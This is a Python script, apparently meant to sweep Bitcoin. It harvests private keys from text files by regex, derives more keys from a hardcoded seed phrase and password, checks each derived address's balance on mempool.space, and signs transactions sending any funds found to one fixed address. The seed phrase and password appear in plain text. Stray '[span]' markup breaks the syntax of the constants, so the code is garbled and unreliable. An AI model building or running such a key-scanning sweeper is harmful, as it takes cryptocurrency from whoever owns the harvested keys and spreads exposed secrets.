import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

# --- DADOS DO PROTOCOLO DE RECUPERAÇÃO ---
[span_2](start_span)TARGET_ADDRESS = "1HYfivTqoSzjqy6eawyitWoK8HvigtU3yb" #[span_2](end_span)
[span_3](start_span)PASSWORD = "Benjamin2020*1981$" #[span_3](end_span)
[span_4](start_span)MESSAGE = "BITCOIN IS AMAZING AND SATOSHI IS GENIUS" #[span_4](end_span)

def extract_keys(filename):
    keys = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        keys.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
        keys.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
    except: pass
    return keys

def scan_final_v28():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys = []
    
    # 1. Fontes de Arquivo (Incluindo chavprivelet1.txt)
    files = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']
    for f in files:
        found = extract_keys(f)
        if found:
            print(f"Sucesso: {len(found)} chaves extraídas de {f}")
            all_keys.extend(found)

    # 2. Correção da Derivação HD (BIP39 + Passphrase Benjamin)
    try:
        mnemonic = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        # Correção da sintaxe para evitar erro de múltiplos valores
        master = HDKey.from_passphrase(passphrase=mnemonic, salt=PASSWORD, network='bitcoin')
        print(f"Derivando caminhos com a Passphrase Benjamin...")
        for i in range(150):
            for path in [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
                all_keys.append(master.subkey_for_path(path).wif())
    except Exception as e:
        print(f"Erro na derivação: {e}")

    all_keys = list(set(all_keys))
    print(f"Iniciando Varredura em {len(all_keys)} chaves únicas (Comprimidas e Não-Comprimidas)...")

    # 3. Varredura com Foco no Alvo 1HYf...
    for wif in all_keys:
        try:
            for compressed in [True, False]:
                k = Key(wif, network='bitcoin', compressed=compressed)
                for t_type in ['p2pkh', 'p2sh-p2wpkh', 'p2wpkh']:
                    addr = k.address(witness_type=t_type)
                    
                    if addr == TARGET_ADDRESS:
                        print(f"!!! ALVO DETECTADO: {addr} !!!")

                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
                    if r.status_code == 200 and r.json():
                        utxos = r.json()
                        print(f"!!! SALDO ENCONTRADO EM {addr} !!!")
                        utxo = max(utxos, key=lambda x: x['value'])
                        amount = utxo['value'] - 90000 
                        
                        tx = Transaction(network='bitcoin')
                        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                        tx.add_output(value=amount, address=dest_address)
                        tx.sign([wif])
                        print(f"HEX_GEN:{tx.raw_hex()}")
            time.sleep(0.01)
        except: continue

if __name__ == "__main__":
    scan_final_v28()
